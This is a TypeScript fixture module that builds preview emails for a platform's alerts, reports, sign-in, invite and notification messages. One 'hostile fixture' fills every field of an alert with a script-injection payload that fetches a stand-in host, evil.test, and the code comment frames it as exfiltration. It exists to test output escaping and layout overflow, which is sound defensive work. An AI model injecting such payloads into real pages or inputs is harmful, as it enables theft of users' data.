/**
 * Fixture content for every email the platform sends.
 *
 * Governed by docs/plans/active/email-design-system-plan.md.
 *
 * These go through the real builders, not a copy of them, so the preview cannot
 * drift from what actually gets sent. The hostile fixture exists because the
 * failure modes worth catching — an unescaped field, an overflowing card list,
 * a 400-character provider payload — are invisible in tidy sample data.
 */

import { buildAgentNotificationEmail } from "../../../../convex/aiToolNotificationService";
import { renderEmail, type RenderedEmail } from "../../../../convex/emailLayoutService";
import { buildTaskAlertEmail } from "../../../../convex/taskAlertEmail";
import { buildTaskReportEmail } from "../../../../convex/taskReportEmail";
import type { EmailPicture } from "../../../../convex/utils/emailPictures";
import { buildAutomationEmail, buildInvitationEmail, buildSignInCodeEmail, buildSignInEmail } from "../../../../convex/platformEmails";
import {
  buildSystemHealthAlertEmail,
  buildSystemHealthPlatformAlertDecision,
  type OperationalFailureExample,
  type OperationalHealthReport,
  type SystemHealthReport,
} from "../../../../convex/platformAlertService";

const BASE_URL = "https://app.example";
const PLATFORM_NAME = "Hakken";

const EMPTY_BUCKET = { count: 0, examples: [] as OperationalFailureExample[] };

function buildOperations(overrides: Partial<OperationalHealthReport> = {}): OperationalHealthReport {
  return {
    agentFailures: EMPTY_BUCKET,
    failedAgentTransactions: EMPTY_BUCKET,
    failedScheduledExecutions: EMPTY_BUCKET,
    failedToolCalls: EMPTY_BUCKET,
    highCostAgents: EMPTY_BUCKET,
    overdueSchedules: EMPTY_BUCKET,
    pendingApprovals: EMPTY_BUCKET,
    providerFailures: EMPTY_BUCKET,
    schedulesMissingNextRun: EMPTY_BUCKET,
    staleAgentRuns: EMPTY_BUCKET,
    staleRunningScheduledExecutions: EMPTY_BUCKET,
    decisionsHandedToPerson: EMPTY_BUCKET,
    decisionsOnSimpleRules: EMPTY_BUCKET,
    decisionsUnsure: EMPTY_BUCKET,
    ...overrides,
  };
}

function buildReport(operations: OperationalHealthReport): SystemHealthReport {
  return {
    alertRules: [],
    analytics: {
      checkedDates: ["2026-07-29", "2026-07-30", "2026-07-31"],
      daysBack: 7,
      liveToday: { agentTransactions: 0, assistantMessages: 0, date: "2026-07-31" },
      messageDimensions: {
        examples: [],
        mismatched: 0,
        missingDimensions: 0,
        missingThreads: 0,
        scanned: 5,
        windowStartDate: "2026-07-24",
      },
      snapshotCoverage: {
        dates: [],
        duplicateSnapshotGroups: [],
        missingGlobalDates: [],
        totalSnapshots: 14,
      },
    },
    budgetHealth: {
      agentCostBudgets: { count: 0, examples: [] },
      tenantMessageBudgets: { count: 0, examples: [] },
    },
    checkedAt: Date.UTC(2026, 6, 31, 0, 25),
    checkedDate: "2026-07-31",
    daysBack: 7,
    highCostAgentThresholdUsd: 5,
    operations,
    overdueScheduleThresholdMinutes: 30,
    pendingApprovalThresholdMinutes: 60,
    scope: { type: "platform" },
    staleRunningThresholdMinutes: 30,
    windowStartDate: "2026-07-24",
    windowStartTs: Date.UTC(2026, 6, 24),
  };
}

/** Verbatim from the alert Anthony received on 2026-07-31. */
const THOUGHT_SIGNATURE_ERROR =
  '{"error":{"message":"{\\n \\"error\\": {\\n \\"code\\": 400,\\n \\"message\\": \\"Function call is missing a thought_signature in functionCall parts. This is required for tools to work co...';
const APIFY_402_ERROR =
  'Uncaught Error: Apify replied 402 to POST /acts/jKpgGfgRfzrGgEMa8/runs: { "error": { "type": "not-enough-usage-to-run-paid-actor", "message": "By launching this job you will exc...';
const APIFY_SECRET_ERROR =
  "Uncaught Error: APIFY_WEBHOOK_SECRET environment variable is missing. at startApifyActor (../convex/apify.ts:191:33) at handler (../convex/apify.ts:86:20)";

function realAlert(): RenderedEmail {
  const operations = buildOperations({
    agentFailures: {
      count: 4,
      examples: Array.from({ length: 4 }, (_, index) => ({
        id: `log_${index}`,
        label: "ERROR",
        occurredAt: Date.UTC(2026, 6, 29, 16, 39 + index),
        summary: THOUGHT_SIGNATURE_ERROR,
        targetId: "agent_research",
        targetName: "Research Agent",
        targetType: "agent" as const,
      })),
    },
    failedToolCalls: {
      count: 2,
      examples: [
        {
          id: "call_1",
          label: "apify",
          occurredAt: Date.UTC(2026, 6, 30, 7, 40),
          summary: APIFY_402_ERROR,
          targetId: "agent_research",
          targetName: "Research Agent",
          targetType: "agent" as const,
        },
        {
          id: "call_2",
          label: "apify",
          occurredAt: Date.UTC(2026, 6, 29, 16, 35),
          summary: APIFY_SECRET_ERROR,
          targetId: "agent_research",
          targetName: "Research Agent",
          targetType: "agent" as const,
        },
      ],
    },
  });
  const report = buildReport(operations);

  return buildSystemHealthAlertEmail(report, buildSystemHealthPlatformAlertDecision(report), {
    baseUrl: BASE_URL,
    platformName: PLATFORM_NAME,
  });
}

/**
 * Everything that can go wrong at once: markup in every field, a payload far
 * longer than the cause limit, and more signals than the card cap allows.
 */
function hostileAlert(): RenderedEmail {
  // The payload deliberately avoids the native-dialog calls that
  // src/quality-drift.test.ts greps for — it scans source text and cannot tell
  // a string literal from a call. Exfiltration is the more realistic payload
  // for an email anyway, since script never executes in a mail client.
  const nasty = '<script>fetch("//evil.test")</script>';
  const operations = buildOperations({
    agentFailures: {
      count: 40,
      examples: Array.from({ length: 40 }, (_, index) => ({
        id: `log_${index}`,
        label: "ERROR",
        occurredAt: Date.UTC(2026, 6, 29, 12, index),
        summary: `${nasty} ${"A very long provider payload that keeps going. ".repeat(12)}`,
        targetId: "agent_hostile",
        targetName: `Agent ${nasty}`,
        targetType: "agent" as const,
      })),
    },
    overdueSchedules: {
      count: 3,
      examples: [{ id: "s1", label: nasty, summary: nasty, targetName: nasty, targetType: "schedule" }],
    },
    pendingApprovals: {
      count: 9,
      examples: [{ id: "a1", label: nasty, summary: nasty, targetName: nasty, targetType: "workflow" }],
    },
    staleAgentRuns: {
      count: 2,
      examples: [{ id: "r1", label: "RUNNING", summary: nasty, targetName: nasty, targetType: "agent" }],
    },
    providerFailures: {
      count: 6,
      examples: [{ id: "p1", label: nasty, summary: nasty, targetName: nasty }],
    },
    // Past the eight-card cap on purpose, so the overflow line is always on screen.
    failedAgentTransactions: {
      count: 5,
      examples: [{ id: "t1", label: nasty, summary: nasty, targetName: nasty, targetType: "agent" }],
    },
    failedScheduledExecutions: {
      count: 4,
      examples: [{ id: "e1", label: nasty, summary: nasty, targetName: nasty, targetType: "workflow" }],
    },
    failedToolCalls: {
      count: 7,
      examples: [{ id: "c1", label: nasty, summary: nasty, targetName: nasty, targetType: "agent" }],
    },
    highCostAgents: {
      count: 3,
      examples: [{ id: "h1", label: nasty, summary: nasty, targetName: nasty, targetType: "agent" }],
    },
    schedulesMissingNextRun: {
      count: 2,
      examples: [{ id: "n1", label: nasty, summary: nasty, targetName: nasty, targetType: "schedule" }],
    },
    staleRunningScheduledExecutions: {
      count: 8,
      examples: [{ id: "sr1", label: nasty, summary: nasty, targetName: nasty, targetType: "workflow" }],
    },
  });
  const report = buildReport(operations);

  return buildSystemHealthAlertEmail(report, buildSystemHealthPlatformAlertDecision(report), {
    baseUrl: BASE_URL,
    platformName: `${PLATFORM_NAME} ${nasty}`,
  });
}

export type EmailPreview = {
  key: string;
  title: string;
  note: string;
  source: string;
  email: RenderedEmail;
  /** The charts it carries, which the preview shows in place of their content ids. */
  pictures?: EmailPicture[];
};

/**
 * A task alert as its owner gets it (board EmailAlertB), from the outbox's own
 * builder: a quiet Monday on a page that usually gets 23 visitors a day.
 */
function taskAlertPreview(): Pick<EmailPreview, "email" | "pictures"> {
  const values = [24, 22, 25, 9, 21, 23, 26, 24, 22, 23, 23, 25, 8, 22, 24, 23, 21, 25, 22, 24, 23, 22, 22, 24, 21, 23, 22, 7];
  const made = buildTaskAlertEmail({
    language: "en",
    brand: { platformName: PLATFORM_NAME, appUrl: BASE_URL },
    task: {
      title: "Tell me if /web-design-london/ gets fewer than 10 visitors a day",
      target: { website: "example.co.uk", page: "https://example.co.uk/web-design-london/" },
      condition: { op: "below", value: 10, days: 1 },
    },
    payload: {
      day: "2026-10-05", value: 7, usual: 23, measure: "visitors", link: "/app/search-console/site/pages",
      headline: "7 visitors on Monday: your web design London page",
      body: "It had 7 visitors from Google on Monday 5 October. It usually gets about 23 a day.",
      series: { from: "2026-09-08", values, met: values.map((value) => value < 10) },
    },
  });
  if ("skip" in made) throw new Error(made.skip);
  return { email: renderEmail(made.content, { platformName: PLATFORM_NAME }), pictures: made.pictures };
}

/** A Monday report as its owner gets it (board EmailReportB), from the outbox's own builder. */
function taskReportPreview(): RenderedEmail {
  const made = buildTaskReportEmail({
    language: "en",
    brand: { platformName: PLATFORM_NAME, appUrl: BASE_URL },
    payload: {
      website: "example.co.uk", from: "2026-09-28", to: "2026-10-04", direction: "lost", weekday: 1, timeOfDay: "09:00", link: "/app/search-console/site/pages",
      pages: [
        { page: "https://example.co.uk/web-design-surrey/", now: 412, change: -96 },
        { page: "https://example.co.uk/hub/how-to-choose-a-web-design-agency/", now: 188, change: -61 },
        { page: "https://example.co.uk/web-design-london/", now: 141, change: -30 },
        { page: "https://example.co.uk/seo-agency-surrey/", now: 97, change: -22 },
        { page: "https://example.co.uk/case-studies/", now: 64, change: -15 },
      ],
    },
  });
  if ("skip" in made) throw new Error(made.skip);
  return renderEmail(made.content, { platformName: PLATFORM_NAME });
}

export function buildEmailPreviews(): EmailPreview[] {
  return [
    {
      key: "task-alert",
      title: "Hakken task alert",
      note: "A quiet day on a page, with its four weeks as a picture attached inline (board EmailAlertB).",
      source: "convex/taskAlertEmail.ts",
      ...taskAlertPreview(),
    },
    {
      key: "task-report",
      title: "Hakken task report",
      note: "Every Monday, the five pages that lost the most visitors (board EmailReportB).",
      source: "convex/taskReportEmail.ts",
      email: taskReportPreview(),
    },
    {
      key: "alert",
      title: "Platform alert",
      note: "The 2026-07-31 alert, rebuilt: four identical faults grouped into one card.",
      source: "convex/platformAlertService.ts",
      email: realAlert(),
    },
    {
      key: "alert-hostile",
      title: "Platform alert — hostile fixture",
      note: "Markup in every field, 40 signals against a cap of 8, and an oversized payload.",
      source: "convex/platformAlertService.ts",
      email: hostileAlert(),
    },
    {
      key: "sign-in",
      title: "Sign-in link",
      note: "The magic link, in style B (board MailSignInLink).",
      source: "convex/platformEmails.ts",
      email: buildSignInEmail({ platformName: PLATFORM_NAME, url: `${BASE_URL}/api/auth/verify`, hours: 24 }),
    },
    {
      key: "sign-in-code",
      title: "Sign-in code",
      note: "The code big, in two halves to read (board MailSignInCode).",
      source: "convex/platformEmails.ts",
      email: buildSignInCodeEmail({ platformName: PLATFORM_NAME, code: "482913", minutes: 10 }),
    },
    {
      key: "invite",
      title: "Invite",
      note: "The default template, with {inviter}, {company} and {platform} filled in (board MailInvitation).",
      source: "convex/platformEmails.ts",
      email: buildInvitationEmail({
        platformName: PLATFORM_NAME,
        url: `${BASE_URL}/login`,
        template: {
          subject: "{inviter} invited you to join {company} on {platform}",
          headline: "{inviter} invited you to join {company} on {platform}",
          body: "{platform} shows how your websites are doing in Google and in AI answers, and keeps an eye on them for you.\n\nIt only takes a minute, and there’s no password to set.",
          ctaText: "Accept the invitation",
        },
        names: { inviter: "Jo Hughes", company: "Ronins Agency" },
      }),
    },
    {
      key: "agent-notification",
      title: "Agent notification",
      note: "Body is model-authored text. The footer states the recipient policy.",
      source: "convex/aiToolNotificationService.ts",
      email: buildAgentNotificationEmail(
        {
          subject: "Four new matches in Guildford",
          body:
            "I collected 986 listings overnight and four clear your criteria — three beds or more, under £500k, chain free.\n\n"
            + "Ash Road, 3 bed semi-detached, £425,000\nChesham Mews, 3 bed end terrace, £465,000\n"
            + "Denzil Road, 3 bed terraced, £399,000\nWodeland Avenue, 2 bed terraced, £380,000",
        },
        { platformName: PLATFORM_NAME, agentName: "Reception" }
      ),
    },
    {
      key: "workflow",
      title: "Workflow email node",
      note: "Body is author-written and template-substituted, so it is escaped too.",
      source: "convex/workflowRuntime.ts",
      email: buildAutomationEmail({
        platformName: PLATFORM_NAME,
        subject: "New lead from the website: Sarah Patel",
        body: "Sarah filled in the contact form on example.co.uk at 14:22.\n\n“We’d like a new website for our dental practice before January. Could someone call me tomorrow?”",
      }),
    },
  ];
}
